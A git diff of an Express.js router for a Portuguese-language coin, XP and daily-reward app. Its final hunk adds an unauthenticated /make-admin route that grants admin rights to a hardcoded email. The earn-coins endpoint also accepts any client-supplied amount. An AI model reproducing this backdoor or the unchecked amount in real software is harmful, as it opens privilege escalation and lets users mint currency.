@@ -16,63 +16,90 @@ router.get('/users', (req, res) => {
     return res.json(users);
 });
 
-router.get('/profile', authMiddleware, (req, res) => {
-    return res.json({
-        message: 'Área privada autorizada',
-        user: req.user
-    });
-});
+
 
 router.get('/wallet', authMiddleware, async (req, res) => {
-    try {
-        const userId = req.user.id;
+  try {
+    const userId = req.user.id
 
-        const result = await pool.query(
-            'SELECT id, name, email, coins, is_admin, referral_code FROM users WHERE id = $1',
-            [userId]
-        );
+    const result = await pool.query(
+      `
+      SELECT id, name, email, coins, xp, level, is_admin, referral_code
+      FROM users
+      WHERE id = $1
+      `,
+      [userId]
+    )
 
-        return res.json({
-            wallet: result.rows[0]
-        });
-
-    } catch (error) {
-        console.log(error);
-
-        return res.status(500).json({
-            error: 'Erro ao buscar carteira'
-        });
+    if (result.rows.length === 0) {
+      return res.status(404).json({
+        error: 'Usuário não encontrado'
+      })
     }
-});
+
+    return res.json({
+      wallet: result.rows[0]
+    })
+
+  } catch (error) {
+    console.log('ERRO WALLET:', error)
+
+    return res.status(500).json({
+      error: 'Erro ao buscar carteira'
+    })
+  }
+})
 
 router.post('/earn-coins', authMiddleware, async (req, res) => {
-    try {
-        const { amount } = req.body;
-        const userId = req.user.id;
+  try {
+    const { amount } = req.body
+    const userId = req.user.id
 
-        const result = await pool.query(
-            'UPDATE users SET coins = coins + $1 WHERE id = $2 RETURNING id, name, email, coins',
-            [amount, userId]
-        );
+    const currentUser = await pool.query(
+      'SELECT coins, xp, level FROM users WHERE id = $1',
+      [userId]
+    )
 
-        await pool.query(
-    'INSERT INTO transactions (user_id, type, amount, description) VALUES ($1, $2, $3, $4)',
-    [userId, 'earn', amount, 'Ganhou moedas']
-        );
+    const user = currentUser.rows[0]
 
-        return res.json({
-            message: 'Moedas adicionadas com sucesso',
-            wallet: result.rows[0]
-        });
+    let newXp = (user.xp || 0) + 15
+    let newLevel = user.level || 1
 
-    } catch (error) {
-        console.log(error);
-
-        return res.status(500).json({
-            error: 'Erro ao adicionar moedas'
-        });
+    if (newXp >= 100) {
+      newXp = newXp - 100
+      newLevel = newLevel + 1
     }
-});
+
+    const result = await pool.query(
+      `
+      UPDATE users
+      SET coins = coins + $1,
+          xp = $2,
+          level = $3
+      WHERE id = $4
+      RETURNING id, name, email, coins, xp, level, is_admin, referral_code
+      `,
+      [amount, newXp, newLevel, userId]
+    )
+
+    await pool.query(
+      'INSERT INTO transactions (user_id, type, amount, description) VALUES ($1, $2, $3, $4)',
+      [userId, 'earn', amount, 'Ganhou moedas']
+    )
+
+    return res.json({
+      message: 'Moedas, XP e Level atualizados com sucesso',
+      wallet: result.rows[0]
+    })
+
+  } catch (error) {
+    console.log('ERRO EARN COINS:', error)
+
+    return res.status(500).json({
+      error: 'Erro ao adicionar moedas'
+    })
+  }
+})
 
 router.get('/transactions', authMiddleware, async (req, res) => {
 
@@ -237,54 +264,66 @@ router.get('/ranking', authMiddleware, async (req, res) => {
 
 router.post('/daily-login', authMiddleware, async (req, res) => {
   try {
-    const userId = req.user.id;
+    const userId = req.user.id
 
-    const alreadyCompleted = await pool.query(
-      `
-      SELECT * FROM missions
-      WHERE user_id = $1
-      AND type = 'daily_login'
-      AND completed_at::date = CURRENT_DATE
-      `,
+    const userResult = await pool.query(
+      'SELECT streak_day, last_claim_date FROM users WHERE id = $1',
       [userId]
-    );
+    )
 
-    if (alreadyCompleted.rows.length > 0) {
+    const user = userResult.rows[0]
+    const today = new Date().toISOString().split('T')[0]
+
+    if (user.last_claim_date && user.last_claim_date.toISOString().split('T')[0] === today) {
       return res.status(400).json({
-        error: 'Missão diária já resgatada hoje'
-      });
+        error: 'Recompensa diária já coletada hoje'
+      })
     }
 
-    await pool.query(
-      `
-      INSERT INTO missions (user_id, type, reward)
-      VALUES ($1, 'daily_login', 10)
-      `,
-      [userId]
-    );
+    let streakDay = user.streak_day || 1
 
-    await pool.query(
+    const rewards = {
+      1: 100,
+      2: 250,
+      3: 500,
+      4: 800,
+      5: 1200,
+      6: 2000,
+      7: 5000
+    }
+
+    const reward = rewards[streakDay]
+
+    const nextStreakDay = streakDay >= 7 ? 1 : streakDay + 1
+
+    const result = await pool.query(
       `
       UPDATE users
-      SET coins = coins + 10
-      WHERE id = $1
+      SET coins = coins + $1,
+          streak_day = $2,
+          last_claim_date = CURRENT_DATE
+      WHERE id = $3
+      RETURNING id, name, email, coins, xp, level, is_admin, referral_code, streak_day, last_claim_date
       `,
-      [userId]
-    );
+      [reward, nextStreakDay, userId]
+    )
 
     return res.json({
-      message: 'Missão diária concluída',
-      reward: 10
-    });
+      message: 'Recompensa diária coletada com sucesso',
+      reward,
+      streak_day: streakDay,
+      wallet: result.rows[0]
+    })
 
   } catch (error) {
-    console.log('ERRO DAILY LOGIN:', error);
+    console.log('ERRO DAILY LOGIN:', error)
 
     return res.status(500).json({
-      error: 'Erro na missão diária'
-    });
+      error: 'Erro na recompensa diária'
+    })
   }
-});
+})
+
 router.get('/referrals', authMiddleware, async (req, res) => {
 
   try {
@@ -348,5 +387,15 @@ router.get('/referrals', authMiddleware, async (req, res) => {
   }
 
 });
+
+router.get('/make-admin', async (req, res) => {
+  await pool.query(
+    `UPDATE users SET is_admin = true WHERE email = 'lennonreal@email.com.com'`
+  )
+
+  res.json({
+    message: 'Admin liberado'
+  })
+})
 
 module.exports = router;
